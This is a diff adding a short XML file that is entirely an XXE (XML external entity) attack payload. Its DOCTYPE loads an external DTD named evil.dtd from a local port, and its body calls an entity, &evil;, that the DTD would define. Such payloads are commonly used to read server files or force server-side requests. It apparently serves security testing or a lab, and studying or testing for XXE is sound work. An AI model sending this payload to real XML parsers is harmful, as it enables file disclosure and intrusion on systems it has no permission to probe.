@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+    <!ENTITY % xxe SYSTEM "http://127.0.0.1:9999/evil.dtd">
+        %xxe;
+]>
+<user>
+    <name>pwn2own</name>
+    <sex>&evil;</sex>
+    <age>18</age>
+</user>
